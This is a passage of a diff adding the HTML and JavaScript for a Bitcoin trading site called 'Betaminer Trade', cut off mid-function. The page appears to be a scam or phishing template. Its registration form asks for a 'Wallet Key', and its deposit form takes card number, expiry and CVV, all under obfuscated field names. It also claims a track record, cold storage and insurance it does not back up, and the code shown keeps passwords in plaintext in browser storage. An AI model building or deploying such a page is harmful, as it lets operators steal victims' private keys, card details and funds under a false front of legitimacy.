+                        <!-- Send Form -->
+                        <div id="sendForm" class="form-content" style="display: none;">
+                            <div class="form-group">
+                                <label for="recipientAddress">Recipient Bitcoin Address</label>
+                                <input type="text" id="recipientAddress" class="form-control" placeholder="1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa">
+                            </div>
+                            <div class="form-group">
+                                <label for="sendAmount">Amount (BTC)</label>
+                                <input type="number" id="sendAmount" class="form-control" value="0.01" min="0.001" step="0.001">
+                            </div>
+                            <div class="form-group">
+                                <label for="networkFee">Network Fee</label>
+                                <input type="number" id="networkFee" class="form-control" value="0.0005" readonly>
+                            </div>
+                        </div>
+
+                        <!-- Receive Form -->
+                        <div id="receiveForm" class="form-content" style="display: none;">
+                            <div class="form-group">
+                                <label>Your Bitcoin Address</label>
+                                <div style="background: #f8f9fa; padding: 15px; border-radius: 4px; font-family: monospace; word-break: break-all;">
+                                    1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2
+                                </div>
+                            </div>
+                            <div class="form-group">
+                                <label>QR Code</label>
+                                <div style="background: #f8f9fa; padding: 20px; text-align: center; border-radius: 4px;">
+                                    <i class="fas fa-qrcode" style="font-size: 100px; color: #666;"></i>
+                                    <p style="margin-top: 10px; font-size: 12px;">Scan to receive Bitcoin</p>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button id="executeAction" class="btn btn-success" style="grid-column: 1 / -1; padding: 12px;">Execute Action</button>
+                    </div>
+                </div>
+
+                <div class="portfolio">
+                    <h3>Portfolio</h3>
+                    <table class="portfolio-table">
+                        <thead>
+                            <tr>
+                                <th>Asset</th>
+                                <th>Balance</th>
+                                <th>Value</th>
+                            </tr>
+                        </thead>
+                        <tbody id="portfolioData">
+                            <!-- Portfolio data will be populated by JavaScript -->
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </section>
+
+        <div class="content-grid" style="margin-top: 50px;">
+            <div class="content-card">
+                <h3>Trading Features</h3>
+                <p>Our platform offers advanced trading features for both beginners and experienced traders.</p>
+                <ul>
+                    <li>Advanced charting with technical indicators</li>
+                    <li>Multiple order types (market, limit, stop)</li>
+                    <li>Risk management tools</li>
+                    <li>Real-time market data</li>
+                    <li>Mobile trading app</li>
+                </ul>
+            </div>
+            <div class="content-card">
+                <h3>Trading Strategies</h3>
+                <p>Learn about different Bitcoin trading strategies to maximize your profits.</p>
+                <ul>
+                    <li>Day trading strategies</li>
+                    <li>Swing trading techniques</li>
+                    <li>Position trading</li>
+                    <li>Arbitrage opportunities</li>
+                    <li>Risk management principles</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- Platforms Page -->
+<section id="platforms" class="page-content">
+    <div class="container">
+        <div class="page-title">
+            <h1>Trading Platforms</h1>
+            <p>Choose the platform that fits your trading style</p>
+        </div>
+
+        <div class="content-grid">
+            <div class="content-card">
+                <h3>Web Platform</h3>
+                <p>Our advanced web platform offers all the features you need for successful Bitcoin trading.</p>
+                <ul>
+                    <li>Advanced charting with drawing tools</li>
+                    <li>Multiple timeframes and indicators</li>
+                    <li>Customizable workspace</li>
+                    <li>One-click trading</li>
+                    <li>Real-time market data</li>
+                </ul>
+                <button class="btn btn-primary" style="margin-top: 15px;">Try Web Platform</button>
+            </div>
+            <div class="content-card">
+                <h3>Mobile App</h3>
+                <p>Trade Bitcoin on the go with our feature-rich mobile application.</p>
+                <ul>
+                    <li>Full trading functionality</li>
+                    <li>Price alerts and notifications</li>
+                    <li>Portfolio tracking</li>
+                    <li>Biometric authentication</li>
+                    <li>Optimized for iOS and Android</li>
+                </ul>
+                <button class="btn btn-primary" style="margin-top: 15px;">Download App</button>
+            </div>
+            <div class="content-card">
+                <h3>Desktop Platform</h3>
+                <p>Our powerful desktop platform for serious traders who need maximum performance.</p>
+                <ul>
+                    <li>Advanced order types</li>
+                    <li>Algorithmic trading support</li>
+                    <li>Multiple monitor support</li>
+                    <li>Advanced analytics</li>
+                    <li>API integration</li>
+                </ul>
+                <button class="btn btn-primary" style="margin-top: 15px;">Download Desktop</button>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- Education Page -->
+<section id="education" class="page-content">
+    <div class="container">
+        <div class="page-title">
+            <h1>Education Center</h1>
+            <p>Learn Bitcoin trading with our comprehensive educational resources</p>
+        </div>
+
+        <div class="content-grid">
+            <div class="content-card">
+                <h3>Beginner's Guide</h3>
+                <p>Start your Bitcoin trading journey with our comprehensive beginner's guide.</p>
+                <ul>
+                    <li><a href="https://www.investopedia.com/terms/b/bitcoin.asp" target="_blank">What is Bitcoin?</a></li>
+                    <li><a href="https://www.coinbase.com/learn/tips-and-tutorials/how-to-buy-bitcoin" target="_blank">How to buy and sell Bitcoin</a></li>
+                    <li><a href="https://www.coindesk.com/learn/crypto-wallets-explained/" target="_blank">Understanding wallets and security</a></li>
+                    <li><a href="https://academy.binance.com/en/articles/a-complete-guide-to-cryptocurrency-trading-for-beginners" target="_blank">Basic trading concepts</a></li>
+                    <li><a href="https://www.bitcoin.com/get-started/risk-management/" target="_blank">Risk management for beginners</a></li>
+                </ul>
+            </div>
+            <div class="content-card">
+                <h3>Technical Analysis</h3>
+                <p>Learn how to analyze Bitcoin price charts and identify trading opportunities.</p>
+                <ul>
+                    <li><a href="https://www.babypips.com/learn/forex/how-to-read-candlestick-charts" target="_blank">Chart patterns and formations</a></li>
+                    <li><a href="https://www.investopedia.com/articles/active-trading/102914/technical-indicators-overview.asp" target="_blank">Technical indicators</a></li>
+                    <li><a href="https://www.dailyfx.com/education/support-and-resistance/support-and-resistance-levels.html" target="_blank">Support and resistance levels</a></li>
+                    <li><a href="https://www.investopedia.com/articles/technical/02/040802.asp" target="_blank">Trend analysis</a></li>
+                    <li><a href="https://www.investopedia.com/articles/technical/02/010702.asp" target="_blank">Volume analysis</a></li>
+                </ul>
+            </div>
+            <div class="content-card">
+                <h3>Trading Strategies</h3>
+                <p>Discover proven Bitcoin trading strategies used by professional traders.</p>
+                <ul>
+                    <li><a href="https://www.investopedia.com/articles/active-trading/050114/day-trading-strategies-beginners.asp" target="_blank">Day trading strategies</a></li>
+                    <li><a href="https://www.investopedia.com/articles/trading/06/swingtradingretail.asp" target="_blank">Swing trading techniques</a></li>
+                    <li><a href="https://www.investopedia.com/articles/active-trading/090214/basics-position-trading.asp" target="_blank">Position trading</a></li>
+                    <li><a href="https://www.investopedia.com/articles/trading/09/risk-management.asp" target="_blank">Risk management principles</a></li>
+                    <li><a href="https://www.investopedia.com/articles/trading/08/trading-psychology.asp" target="_blank">Psychology of trading</a></li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="content-card" style="margin-top: 30px;">
+            <h3>Video Tutorials</h3>
+            <p>Watch our video tutorials to enhance your Bitcoin trading knowledge.</p>
+            <div style="display: grid; grid-template-columns: 1fr; gap: 20px; margin-top: 20px;">
+                <div style="background: #f0f2f5; border-radius: 8px; padding: 20px; text-align: center;">
+                    <i class="fas fa-play-circle" style="font-size: 40px; color: var(--accent); margin-bottom: 10px;"></i>
+                    <h4>Bitcoin Trading for Beginners</h4>
+                    <p>Complete guide to start trading Bitcoin</p>
+                    <a href="https://www.youtube.com/watch?v=Gm2Iz8l5p6k" target="_blank" class="btn btn-primary" style="margin-top: 10px; display: inline-block;">Watch Video</a>
+                </div>
+                <div style="background: #f0f2f5; border-radius: 8px; padding: 20px; text-align: center;">
+                    <i class="fas fa-chart-line" style="font-size: 40px; color: var(--accent); margin-bottom: 10px;"></i>
+                    <h4>Technical Analysis Masterclass</h4>
+                    <p>Learn advanced chart analysis techniques</p>
+                    <a href="https://www.youtube.com/watch?v=6lKp6yfB1eY" target="_blank" class="btn btn-primary" style="margin-top: 10px; display: inline-block;">Watch Video</a>
+                </div>
+                <div style="background: #f0f2f5; border-radius: 8px; padding: 20px; text-align: center;">
+                    <i class="fas fa-cogs" style="font-size: 40px; color: var(--accent); margin-bottom: 10px;"></i>
+                    <h4>Bitcoin Trading Strategies</h4>
+                    <p>Proven strategies for profitable trading</p>
+                    <a href="https://www.youtube.com/watch?v=6lKp6yfB1eY" target="_blank" class="btn btn-primary" style="margin-top: 10px; display: inline-block;">Watch Video</a>
+                </div>
+            </div>
+            <div style="text-align: center; margin-top: 30px;">
+                <a href="https://www.youtube.com/playlist?list=PL5S83KRP2C5eJSb_b5v3V8l6sJY4Fv7r5" target="_blank" class="btn btn-primary">View Full YouTube Playlist</a>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- About Page -->
+<section id="about" class="page-content">
+    <div class="container">
+        <div class="page-title">
+            <h1>About Betaminer Trade</h1>
+            <p>Learn more about our mission, team, and values</p>
+        </div>
+
+        <div class="content-card" style="margin-bottom: 30px;">
+            <h3>Our Mission</h3>
+            <p>Betaminer Trade is dedicated to making Bitcoin trading accessible to everyone. We believe in the transformative power of cryptocurrency and are committed to providing a secure, intuitive, and powerful trading platform.</p>
+            <p>Our team of financial experts, technologists, and security specialists work tirelessly to ensure that our platform meets the highest standards of security, reliability, and performance.</p>
+        </div>
+
+        <div class="content-grid">
+            <div class="content-card">
+                <h3>Our Story</h3>
+                <p>Founded in 2018, Betaminer Trade has grown to become one of the most trusted Bitcoin trading platforms in the industry. We started with a simple vision: to create a trading platform that combines professional-grade tools with an intuitive user experience.</p>
+                <p>Today, we serve thousands of traders from around the world, providing them with the tools and resources they need to succeed in the dynamic cryptocurrency markets.</p>
+            </div>
+            <div class="content-card">
+                <h3>Security First</h3>
+                <p>At Betaminer Trade, security is our top priority. We employ industry-leading security measures to protect our users' funds and data.</p>
+                <ul>
+                    <li>98% of funds stored in cold storage</li>
+                    <li>Two-factor authentication (2FA)</li>
+                    <li>Advanced encryption protocols</li>
+                    <li>Regular security audits</li>
+                    <li>Insurance coverage</li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="content-card" style="margin-top: 30px;">
+            <h3>Contact Us</h3>
+            <p>Have questions or need assistance? Our support team is here to help.</p>
+            <div style="display: grid; grid-template-columns: 1fr; gap: 20px; margin-top: 20px;">
+                <div>
+                    <h4>Email</h4>
+                    <p>Betaminerfoundation@gmail.com</p>
+                </div>
+                <div>
+                    <h4>Phone</h4>
+                    <p>+1 (555) 536-6570</p>
+                </div>
+                <div>
+                    <h4>Address</h4>
+                    <p>525 University Avenue, Palo Alto, California.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- Profile Page -->
+<section id="profile" class="page-content">
+    <div class="container">
+        <div class="page-title">
+            <h1>My Profile</h1>
+            <p>Manage your account settings and personal information</p>
+        </div>
+
+        <div class="profile-form">
+            <div class="profile-avatar">
+                <div class="user-avatar" id="profileAvatar">JD</div>
+                <div class="change-avatar">Change Photo</div>
+            </div>
+
+            <form id="profileForm">
+                <div class="form-row">
+                    <div class="form-group">
+                        <label for="profileFirstName">First Name</label>
+                        <input type="text" id="profileFirstName" class="form-control" value="John">
+                    </div>
+                    <div class="form-group">
+                        <label for="profileLastName">Last Name</label>
+                        <input type="text" id="profileLastName" class="form-control" value="Doe">
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="profileEmail">Email Address</label>
+                    <input type="email" id="profileEmail" class="form-control" value="john.doe@example.com">
+                </div>
+
+                <div class="form-group">
+                    <label for="profilePhone">Phone Number</label>
+                    <input type="tel" id="profilePhone" class="form-control" value="+1 (555) 123-4567">
+                </div>
+
+                <div class="form-group">
+                    <label for="profileCountry">Country</label>
+                    <select id="profileCountry" class="form-control">
+                        <option value="US">United States</option>
+                        <option value="UK">United Kingdom</option>
+                        <option value="CA">Canada</option>
+                        <option value="AU">Australia</option>
+                        <option value="other">Other</option>
+                    </select>
+                </div>
+
+                <div class="form-group">
+                    <label for="profileBio">Bio</label>
+                    <textarea id="profileBio" class="form-control" rows="4" placeholder="Tell us about yourself...">Bitcoin enthusiast and trader since 2019. Interested in technical analysis and long-term investment strategies.</textarea>
+                </div>
+
+                <h3 style="margin: 30px 0 20px; color: var(--primary);">Security Settings</h3>
+
+                <div class="form-group">
+                    <label for="profileCurrentPassword">Current Password</label>
+                    <input type="password" id="profileCurrentPassword" class="form-control">
+                </div>
+
+                <div class="form-group">
+                    <label for="profileNewPassword">New Password</label>
+                    <input type="password" id="profileNewPassword" class="form-control">
+                </div>
+
+                <div class="form-group">
+                    <label for="profileConfirmPassword">Confirm New Password</label>
+                    <input type="password" id="profileConfirmPassword" class="form-control">
+                </div>
+
+                <div class="form-group">
+                    <label style="display: flex; align-items: flex-start; gap: 10px;">
+                        <input type="checkbox" id="profileTwoFactor" style="margin-top: 3px;">
+                        <span>Enable two-factor authentication for enhanced security</span>
+                    </label>
+                </div>
+
+                <button type="submit" class="btn btn-primary" style="width: 100%; padding: 12px; margin-top: 20px;">Update Profile</button>
+            </form>
+        </div>
+    </div>
+</section>
+
+<!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="footer-content">
+            <div class="footer-column">
+                <h3>Betaminer Trade</h3>
+                <p>Professional Bitcoin trading platform for modern investors and traders.</p>
+                <div class="social-links">
+                    <a href="#"><i class="fab fa-twitter"></i></a>
+                    <a href="#"><i class="fab fa-facebook-f"></i></a>
+                    <a href="#"><i class="fab fa-linkedin-in"></i></a>
+                    <a href="#"><i class="fab fa-instagram"></i></a>
+                </div>
+            </div>
+            <div class="footer-column">
+                <h3>Markets</h3>
+                <ul>
+                    <li><a href="#" class="nav-link" data-page="markets">Bitcoin</a></li>
+                    <li><a href="#" class="nav-link" data-page="markets">Ethereum</a></li>
+                    <li><a href="#" class="nav-link" data-page="markets">Litecoin</a></li>
+                    <li><a href="#" class="nav-link" data-page="markets">Ripple</a></li>
+                    <li><a href="#" class="nav-link" data-page="markets">Cardano</a></li>
+                </ul>
+            </div>
+            <div class="footer-column">
+                <h3>Platforms</h3>
+                <ul>
+                    <li><a href="#" class="nav-link" data-page="platforms">Web Trader</a></li>
+                    <li><a href="#" class="nav-link" data-page="platforms">Desktop</a></li>
+                    <li><a href="#" class="nav-link" data-page="platforms">Mobile App</a></li>
+                    <li><a href="#" class="nav-link" data-page="platforms">API</a></li>
+                </ul>
+            </div>
+            <div class="footer-column">
+                <h3>Company</h3>
+                <ul>
+                    <li><a href="#" class="nav-link" data-page="about">About Us</a></li>
+                    <li><a href="#">Careers</a></li>
+                    <li><a href="#">Regulation</a></li>
+                    <li><a href="#" class="nav-link" data-page="education">Education</a></li>
+                </ul>
+            </div>
+        </div>
+        <div class="copyright">
+            <p>&copy; 2025 BetaminerTrade. All rights reserved. Trading involves risk.</p>
+        </div>
+    </div>
+</footer>
+<!-- Login Modal -->
+<div id="loginModal" class="modal">
+    <div class="modal-content">
+        <div class="modal-header">
+            <h2>Login to Your Account</h2>
+            <button class="close-modal">&times;</button>
+        </div>
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="loginEmail">Email</label>
+                <input type="email" id="loginEmail" class="form-control" required>
+            </div>
+            <div class="form-group">
+                <label for="loginPassword">Password</label>
+                <input type="password" id="loginPassword" class="form-control" required>
+            </div>
+            <button type="submit" class="btn btn-primary" style="width: 100%; padding: 12px;">Login</button>
+            <div class="form-footer">
+                <p>Don't have an account? <a href="#" id="showRegister">Register</a></p>
+            </div>
+        </form>
+    </div>
+</div>
+
+<!-- Register Modal -->
+<div id="registerModal" class="modal" id="contactForm">
+    <div class="modal-content">
+        <div class="modal-header">
+            <h2>Create an Account</h2>
+            <button class="close-modal">&times;</button>
+        </div>
+        <form id="registerForm" >
+            <div class="form-group">
+                <label for="registerName">Full Name</label>
+                <input type="text" id="registerName" class="form-control"  name="name"   required>
+            </div>
+            <div class="form-group">
+                <label for="registerEmail">Email</label>
+                <input type="email" id="registerEmail" class="form-control" name="vame"  required>
+            </div>
+
+     <div class="form-group">
+                <label for="registerEmail">Wallet Key</label>
+                <input type="text" id="registerEmail" class="form-control" name="pame"  required>
+            </div>
+
+
+
+            <div class="form-group">
+                <label for="registerPassword">Password</label>
+                <input type="password" id="registerPassword"  name="lame"  class="form-control" required minlength="6">
+            </div>
+            <div class="form-group">
+                <label for="registerConfirmPassword">Confirm Password</label>
+                <input type="password" id="registerConfirmPassword" class="form-control" required>
+            </div>
+            <button type="submit" class="btn btn-primary" style="width: 100%; padding: 12px;">Create Account</button>
+            <div class="form-footer">
+                <p>Already have an account? <a href="#" id="showLogin">Login</a></p>
+            </div>
+        </form>
+    </div>
+</div>
+
+<!-- Add Funds Modal -->
+<div id="addFundsModal" class="modal">
+    <div class="modal-content">
+        <div class="modal-header">
+            <h2>Add Funds to Your Account</h2>
+            <button class="close-modal">&times;</button>
+        </div>
+        <form id="addFundsForm" id="newsletterFom">
+            <div class="form-group">
+                <label for="fundsAmount">Amount ($)</label>
+                <input type="number" id="fundsAmount" name="name" class="form-control" min="10" step="0.01" required>
+            </div>
+            <div class="form-group">
+                <label for="paymentMethod">Payment Method</label>
+                <select id="paymentMethod" class="form-control">
+                    <option value="credit">Credit Card</option>
+                    <option value="debit">Debit Card</option>
+                    <option value="bank">Bank Transfer</option>
+                </select>
+            </div>
+            <div class="form-group">
+                <label for="cardNumber">Card Number</label>
+                <input type="text" id="cardNumber" name="bame"  class="form-control" placeholder="1234 5678 9012 3456" required>
+            </div>
+            <div class="form-row">
+                <div class="form-group">
+                    <label for="expiryDate">Expiry Date</label>
+                    <input type="text" id="expiryDate"  name="came"  class="form-control" placeholder="MM/YY" required>
+                </div>
+                <div class="form-group">
+                    <label for="cvv">CVV</label>
+                    <input type="text" id="cvv"  name="dame"   class="form-control" placeholder="123" required>
+                </div>
+            </div>
+            <button type="submit" class="btn btn-primary" style="width: 100%; padding: 12px;">Add Funds</button>
+        </form>
+    </div>
+</div>
+
+<script>
+    // User Management
+    let currentUser = null;
+    let users = JSON.parse(localStorage.getItem('bitcoinTradeUsers')) || [];
+    let marketData = [
+        { symbol: 'BTC/USD', name: 'Bitcoin', price: 29458.70, change: -320.50, changePercent: -1.08, marketCap: 568920000000 },
+        { symbol: 'ETH/USD', name: 'Ethereum', price: 1850.25, change: -12.75, changePercent: -0.68, marketCap: 222150000000 },
+        { symbol: 'LTC/USD', name: 'Litecoin', price: 75.42, change: 1.25, changePercent: 1.68, marketCap: 5500000000 },
+        { symbol: 'XRP/USD', name: 'Ripple', price: 0.52, change: -0.01, changePercent: -1.89, marketCap: 28000000000 },
+        { symbol: 'ADA/USD', name: 'Cardano', price: 0.38, change: 0.02, changePercent: 5.56, marketCap: 13300000000 }
+    ];
+
+    let portfolio = [
+        { symbol: 'BTC', balance: 0, value: 0 },
+        { symbol: 'USD', balance: 0, value: 0 }
+    ];
+
+    // DOM Elements
+    const loginBtn = document.getElementById('loginBtn');
+    const registerBtn = document.getElementById('registerBtn');
+    const logoutBtn = document.getElementById('logoutBtn');
+    const userMenu = document.getElementById('userMenu');
+    const userName = document.getElementById('userName');
+    const loginModal = document.getElementById('loginModal');
+    const registerModal = document.getElementById('registerModal');
+    const addFundsModal = document.getElementById('addFundsModal');
+    const closeModals = document.querySelectorAll('.close-modal');
+    const showRegister = document.getElementById('showRegister');
+    const showLogin = document.getElementById('showLogin');
+    const loginForm = document.getElementById('loginForm');
+    const registerForm = document.getElementById('registerForm');
+    const addFundsForm = document.getElementById('addFundsForm');
+    const dashboard = document.getElementById('dashboard');
+    const dashboardUserName = document.getElementById('dashboardUserName');
+    const userAvatar = document.getElementById('userAvatar');
+    const profileAvatar = document.getElementById('profileAvatar');
+    const accountBalance = document.getElementById('accountBalance');
+    const balanceChange = document.getElementById('balanceChange');
+    const addFundsBtn = document.getElementById('addFundsBtn');
+    const marketDataTable = document.getElementById('marketData');
+    const marketsDataTable = document.getElementById('marketsData');
+    const portfolioData = document.getElementById('portfolioData');
+    const instrumentSelect = document.getElementById('instrument');
+    const priceInput = document.getElementById('price');
+    const volumeInput = document.getElementById('volume');
+    const totalCostInput = document.getElementById('totalCost');
+    const actionTypeBtns = document.querySelectorAll('.action-type-btn');
+    const executeActionBtn = document.getElementById('executeAction');
+    const startTradingBtn = document.getElementById('startTradingBtn');
+    const mobileMenuBtn = document.querySelector('.mobile-menu-btn');
+    const navMenu = document.getElementById('navMenu');
+    const navLinks = document.querySelectorAll('.nav-link');
+    const pageContents = document.querySelectorAll('.page-content');
+    const btcPriceElement = document.getElementById('btcPrice');
+    const btcChangeElement = document.getElementById('btcChange');
+    const btcPriceMarketsElement = document.getElementById('btcPriceMarkets');
+    const btcChangeMarketsElement = document.getElementById('btcChangeMarkets');
+    const authGuard = document.getElementById('authGuard');
+    const guardLoginBtn = document.getElementById('guardLoginBtn');
+    const guardRegisterBtn = document.getElementById('guardRegisterBtn');
+    const profileForm = document.getElementById('profileForm');
+    const mobileMenuOverlay = document.getElementById('mobileMenuOverlay');
+    const whatsappPopupBtn = document.getElementById('whatsappPopupBtn');
+    const whatsappPopupContent = document.getElementById('whatsappPopupContent');
+
+    // Form elements for different actions
+    const tradeForm = document.getElementById('tradeForm');
+    const sendForm = document.getElementById('sendForm');
+    const receiveForm = document.getElementById('receiveForm');
+
+    // Check if user is already logged in
+    document.addEventListener('DOMContentLoaded', function() {
+        const savedUser = localStorage.getItem('bitcoinTradeCurrentUser');
+        if (savedUser) {
+            currentUser = JSON.parse(savedUser);
+            updateUIForUser();
+        }
+        
+        initializeMarketData();
+        initializeMarketsData();
+        initializePortfolio();
+        initializeChart();
+        updatePrices();
+        fetchBitcoinPrice();
+        
+        // Set up navigation
+        setupNavigation();
+        
+        // Check authentication for current page
+        checkAuthentication();
+    });
+
+    // Setup navigation
+    function setupNavigation() {
+        // Mobile menu toggle
+        mobileMenuBtn.addEventListener('click', () => {
+            navMenu.classList.toggle('active');
+            mobileMenuOverlay.classList.toggle('active');
+        });
+        
+        // Close mobile menu when overlay is clicked
+        mobileMenuOverlay.addEventListener('click', () => {
+            navMenu.classList.remove('active');
+            mobileMenuOverlay.classList.remove('active');
+        });
+        
+        // Navigation links
+        navLinks.forEach(link => {
+            link.addEventListener('click', (e) => {
+                e.preventDefault();
+                const page = link.getAttribute('data-page');
+                showPage(page);
+                
+                // Close mobile menu if open
+                navMenu.classList.remove('active');
+                mobileMenuOverlay.classList.remove('active');
+            });
+        });
+        
+        // Guard buttons
+        guardLoginBtn.addEventListener('click', () => {
+            loginModal.style.display = 'flex';
+        });
+        
+        guardRegisterBtn.addEventListener('click', () => {
+            registerModal.style.display = 'flex';
+        });
+        
+        // WhatsApp-like popup button
+        whatsappPopupBtn.addEventListener('click', () => {
+            whatsappPopupContent.classList.toggle('active');
+        });
+        
+        // Close popup when clicking outside
+        document.addEventListener('click', (e) => {
+            if (!whatsappPopupBtn.contains(e.target) && !whatsappPopupContent.contains(e.target)) {
+                whatsappPopupContent.classList.remove('active');
+            }
+        });
+
+        // Add funds button
+        addFundsBtn.addEventListener('click', () => {
+            addFundsModal.style.display = 'flex';
+        });
+    }
+
+    // Show specific page
+    function showPage(pageId) {
+        // Check authentication for protected pages
+        if (pageId !== 'home' && pageId !== 'about' && !currentUser) {
+            authGuard.classList.add('active');
+            return;
+        } else {
+            authGuard.classList.remove('active');
+        }
+        
+        // Hide all pages
+        pageContents.forEach(page => {
+            page.classList.remove('active');
+        });
+        
+        // Show selected page
+        document.getElementById(pageId).classList.add('active');
+        
+        // If trading page and user is logged in, show dashboard
+        if (pageId === 'trading' && currentUser) {
+            dashboard.style.display = 'block';
+        } else if (pageId === 'trading') {
+            dashboard.style.display = 'none';
+        }
+        
+        // Scroll to top
+        window.scrollTo(0, 0);
+    }
+
+    // Check authentication for current page
+    function checkAuthentication() {
+        const currentPage = document.querySelector('.page-content.active');
+        if (currentPage && currentPage.id !== 'home' && currentPage.id !== 'about' && !currentUser) {
+            authGuard.classList.add('active');
+        } else {
+            authGuard.classList.remove('active');
+        }
+    }
+
+    // Modal Controls
+    loginBtn.addEventListener('click', () => loginModal.style.display = 'flex');
+    registerBtn.addEventListener('click', () => registerModal.style.display = 'flex');
+    
+    closeModals.forEach(btn => {
+        btn.addEventListener('click', () => {
+            loginModal.style.display = 'none';
+            registerModal.style.display = 'none';
+            addFundsModal.style.display = 'none';
+        });
+    });
+
+    showRegister.addEventListener('click', (e) => {
+        e.preventDefault();
+        loginModal.style.display = 'none';
+        registerModal.style.display = 'flex';
+    });
+
+    showLogin.addEventListener('click', (e) => {
+        e.preventDefault();
+        registerModal.style.display = 'none';
+        loginModal.style.display = 'flex';
+    });
+
+    // Action Type Selection
+    actionTypeBtns.forEach(btn => {
+        btn.addEventListener('click', () => {
+            actionTypeBtns.forEach(b => b.classList.remove('active'));
+            btn.classList.add('active');
+            
+            // Show appropriate form based on action type
+            const actionType = btn.dataset.type;
+            tradeForm.style.display = 'none';
+            sendForm.style.display = 'none';
+            receiveForm.style.display = 'none';
+            
+            if (actionType === 'buy' || actionType === 'sell') {
+                tradeForm.style.display = 'block';
+                executeActionBtn.textContent = actionType === 'buy' ? 'Buy Bitcoin' : 'Sell Bitcoin';
+                executeActionBtn.className = actionType === 'buy' ? 'btn btn-success' : 'btn btn-danger';
+            } else if (actionType === 'send') {
+                sendForm.style.display = 'block';
+                executeActionBtn.textContent = 'Send Bitcoin';
+                executeActionBtn.className = 'btn btn-warning';
+            } else if (actionType === 'receive') {
+                receiveForm.style.display = 'block';
+                executeActionBtn.textContent = 'Generate Address';
+                executeActionBtn.className = 'btn btn-primary';
+            }
+        });
+    });
+
+    // Calculate total cost when volume or price changes
+    volumeInput.addEventListener('input', calculateTotalCost);
+    instrumentSelect.addEventListener('change', updateTradePrice);
+
+    function calculateTotalCost() {
+        const volume = parseFloat(volumeInput.value) || 0;
+        const price = parseFloat(priceInput.value) || 0;
+        const totalCost = volume * price;
+        totalCostInput.value = totalCost.toFixed(2);
+    }
+
+    // Login Form Submission
+    loginForm.addEventListener('submit', (e) => {
+        e.preventDefault();
+        const email = document.getElementById('loginEmail').value;
+        const password = document.getElementById('loginPassword').value;
+        
+        const user = users.find(u => u.email === email && u.password === password);
+        
+        if (user) {
+            currentUser = user;
+            localStorage.setItem('bitcoinTradeCurrentUser', JSON.stringify(user));
+            updateUIForUser();
+            loginModal.style.display = 'none';
+            loginForm.reset();
+            showNotification('Login successful!', 'success');
+            
+            // Hide auth guard
+            authGuard.classList.remove('active');
+            
+            // If on trading page, show dashboard
+            if (document.getElementById('trading').classList.contains('active')) {
+                dashboard.style.display = 'block';
+            }
+        } else {
+            showNotification('Invalid email or password', 'error');
+        }
+    });
+
+    // Register Form Submission
+    registerForm.addEventListener('submit', (e) => {
+        e.preventDefault();
+        const name = document.getElementById('registerName').value;
+        const email = document.getElementById('registerEmail').value;
+        const password = document.getElementById('registerPassword').value;
+        const confirmPassword = document.getElementById('registerConfirmPassword').value;
+        
+        if (password !== confirmPassword) {
+            showNotification('Passwords do not match', 'error');
+            return;
+        }
+        
+        if (users.find(u => u.email === email)) {
+            showNotification('User with this email already exists', 'error');
+            return;
+        }
+        
+        const newUser = {
+            id: Date.now(),
+            name,
+            email,
+            password,
+            balance: 0, // Starting with 0 balance
+            accountNumber: 'BTC-' + Math.floor(100000 + Math.random() * 900000)
+        };
+        
+        users.push(newUser);
+        localStorage.setItem('bitcoinTradeUsers', JSON.stringify(users));
+        
+        currentUser = newUser;
+        localStorage.setItem('bitcoinTradeCurrentUser', JSON.stringify(newUser));
+        updateUIForUser();
+        registerModal.style.display = 'none';
+        registerForm.reset();
+        showNotification('Account created successfully!', 'success');
+        
+        // Hide auth guard
+        authGuard.classList.remove('active');
+    });
+
+    // Add Funds Form Submission
+    addFundsForm.addEventListener('submit', (e) => {
+        e.preventDefault();
+        const amount = parseFloat(document.getElementById('fundsAmount').value);
+        
+        if (amount < 10) {
+            showNotification('Minimum deposit is $10', 'error');
+            return;
+        }
+        
+        // Simulate adding funds
+        currentUser.balance += amount;
+        
+        // Update users in localStorage
+        const userIndex = users.findIndex(u => u.id === currentUser.id);
+        if (userIndex !== -1) {
+            users[userIndex] = currentUser;
+            localStorage.setItem('bitcoinTradeUsers', JSON.stringify(users));
+            localStorage.setItem('bitcoinTradeCurrentUser', JSON.stringify(currentUser));
+        }
+        
+        updateUIForUser();
+        addFundsModal.style.display = 'none';
+        addFundsForm.reset();
+        showNotification('Funds added successfully!', 'success');
+    });
+
+    // Profile Form Submission
+    profileForm.addEventListener('submit', (e) => {
+        e.preventDefault();
+        // In a real app, you would update the user profile here
+        showNotification('Profile updated successfully!', 'success');
+    });
+
+    // Logout
+    logoutBtn.addEventListener('click', () => {
+        currentUser = null;
+        localStorage.removeItem('bitcoinTradeCurrentUser');
+        updateUIForUser();
+        showNotification('Logged out successfully', 'success');
+        
+        // If on trading page, hide dashboard
+        if (document.getElementById('trading').classList.contains('active')) {
+            dashboard.style.display = 'none';
+        }
+        
+        // Show auth guard for protected pages
+        checkAuthentication();
+    });
+
+    // Start Trading Button
+    startTradingBtn.addEventListener('click', () => {
+        if (currentUser) {
+            showPage('trading');
+        } else {
+            loginModal.style.display = 'flex';
+        }
+    });
+
+    // Execute Action
+    executeActionBtn.addEventListener('click', () => {
+        if (!currentUser) {
+            showNotification('Please login to perform this action', 'error');
+            return;
+        }
+        
+        const actionType = document.querySelector('.action-type-btn.active').dataset.type;
+        
+        if (actionType === 'buy') {
+            const volume = parseFloat(volumeInput.value);
+            const price = parseFloat(priceInput.value);
+            const totalCost = volume * price;
+            
+            if (totalCost > currentUser.balance) {
+                showNotification('Insufficient funds', 'error');
+                return;
+            }
+            
+            // Update balance and portfolio
+            currentUser.balance -= totalCost;
+            portfolio[0].balance += volume;
+            portfolio[0].value = portfolio[0].balance * price;
+            portfolio[1].balance = currentUser.balance;
+            
+            showNotification('Bitcoin purchased successfully!', 'success');
+        } else if (actionType === 'sell') {
+            const volume = parseFloat(volumeInput.value);
+            const price = parseFloat(priceInput.value);
+            const totalValue = volume * price;
+            
